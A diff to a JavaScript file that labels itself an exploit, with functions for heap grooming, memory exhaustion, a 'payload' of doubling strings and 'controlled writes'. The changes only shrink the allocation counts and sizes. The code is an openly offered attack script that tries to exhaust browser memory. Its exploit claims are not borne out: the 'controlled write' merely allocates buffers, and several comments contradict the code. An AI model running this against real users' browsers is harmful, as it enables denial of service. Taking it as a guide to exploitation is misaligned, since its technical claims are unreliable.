@@ -8,8 +8,8 @@ alert("Start?")
 // Step 1: Initialize Controlled Memory
 function initializeHeap() {
     let buffers = [];
-    for (let i = 0; i < 1000; i++) {
-        buffers.push(new ArrayBuffer(1000000)); // Allocate a block of memory
+    for (let i = 0; i < 500; i++) { // Reduced allocations
+        buffers.push(new ArrayBuffer(500000)); // Smaller blocks of memory
     }
     return buffers;
 }
@@ -19,13 +19,13 @@ function groomHeap() {
     let tempArray = [];
 
     // Allocate and deallocate in patterns
-    for (let i = 0; i < 100; i++) {
-        let buffer = new ArrayBuffer(1000000); // Allocate
+    for (let i = 0; i < 50; i++) { // Reduced iterations
+        let buffer = new ArrayBuffer(500000); // Allocate smaller blocks
         tempArray.push(buffer);
     }
 
     // Deallocate some of the buffers to create holes in the heap
-    for (let i = 0; i < 50; i++) {
+    for (let i = 0; i < 25; i++) { // Fewer deallocations
         tempArray[i] = null; // Free up space to create holes in the heap
     }
 
@@ -35,9 +35,9 @@ function groomHeap() {
 // Step 3: Memory Exhaustion Function
 function memExh() {
     let bufferArray = [];
-    for (let i = 0; i < 8192; i++) {
-        bufferArray.push(new ArrayBuffer(1000000)); // Allocate large buffers
-        if (bufferArray.length > 1000) {
+    for (let i = 0; i < 4096; i++) { // Reduced iterations
+        bufferArray.push(new ArrayBuffer(500000)); // Allocate smaller buffers
+        if (bufferArray.length > 500) { // Less aggressive clearing
             bufferArray = []; // Clear buffer array to exhaust memory
         }
     }
@@ -45,7 +45,7 @@ function memExh() {
 
 // Step 4: The Exploit Payload Function
 function payload() {
-    let largeString = "A".repeat(1000000); // 1 million A's
+    let largeString = "A".repeat(500000); // Smaller initial string
     let nestedArray = [];
     let obj = {};
     let iterationCount = 0; // Counter to track number of iterations
@@ -53,20 +53,20 @@ function payload() {
     while (true) {
         // String concatenation
         largeString += largeString;
-        if (largeString.length > 100000000) {
-            largeString = "A".repeat(1000000); // Reset string to avoid overflow
+        if (largeString.length > 50000000) { // Lower threshold for reset
+            largeString = "A".repeat(500000); // Reset string to avoid overflow
         }
 
         memExh(); // Exhaust memory
 
         // Nested arrays
         nestedArray.push([]);
-        if (nestedArray.length > 1000) {
+        if (nestedArray.length > 500) { // Reduced nesting
             nestedArray = []; // Clear nested arrays to exhaust memory
         }
 
         iterationCount++;
-        if (iterationCount > 100) break; // Limit iterations to avoid endless loop
+        if (iterationCount > 50) break; // Limit iterations to avoid endless loop
     }
 }
 
@@ -79,9 +79,9 @@ function performExploit() {
     payload();
 
     // Perform the controlled memory write
-    for (let i = 0; i < 1000; i++) {
+    for (let i = 0; i < 500; i++) { // Fewer controlled writes
         // Controlled write operations
-        let buffer = new ArrayBuffer(1000); // Smaller allocation for controlled overwrite
+        let buffer = new ArrayBuffer(500); // Smaller allocation for controlled overwrite
         controlledBuffers.push(buffer);
     }
 }
